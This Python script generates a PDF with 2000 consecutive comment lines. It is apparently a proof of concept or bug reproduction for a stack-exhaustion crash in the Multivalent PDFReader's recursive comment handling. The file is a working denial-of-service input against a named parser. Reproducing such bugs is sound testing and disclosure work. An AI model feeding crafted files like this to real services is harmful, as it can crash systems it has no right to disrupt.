#!/usr/bin/env python3
"""
Generates a minimal PDF with many consecutive % comment lines.

The Multivalent PDFReader.eatSpace() method handles PDF comments (%) by calling
readObject() to consume the comment line, then recursively calling eatSpace()
again. With enough consecutive comment lines, this exhausts the JVM stack.

The default JVM stack handles ~2000 levels comfortably, but constrained
environments (Docker, -Xss256k) overflow far sooner.
"""

lines = []
lines.append(b"%PDF-1.4\n")

num_comments = 2000
for i in range(num_comments):
    lines.append(f"% comment line {i}\n".encode())

catalog_offset = sum(len(l) for l in lines)
lines.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
pages_offset = sum(len(l) for l in lines)
lines.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
page_offset = sum(len(l) for l in lines)
lines.append(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >>\nendobj\n")

xref_offset = sum(len(l) for l in lines)
lines.append(b"xref\n")
lines.append(b"0 4\n")
lines.append(b"0000000000 65535 f \n")
lines.append(f"{catalog_offset:010d} 00000 n \n".encode())
lines.append(f"{pages_offset:010d} 00000 n \n".encode())
lines.append(f"{page_offset:010d} 00000 n \n".encode())
lines.append(b"trailer\n<< /Size 4 /Root 1 0 R >>\n")
lines.append(b"startxref\n")
lines.append(f"{xref_offset}\n".encode())
lines.append(b"%%EOF\n")

with open("many-comments.pdf", "wb") as f:
    for line in lines:
        f.write(line)

print(f"Created many-comments.pdf with {num_comments} comment lines")
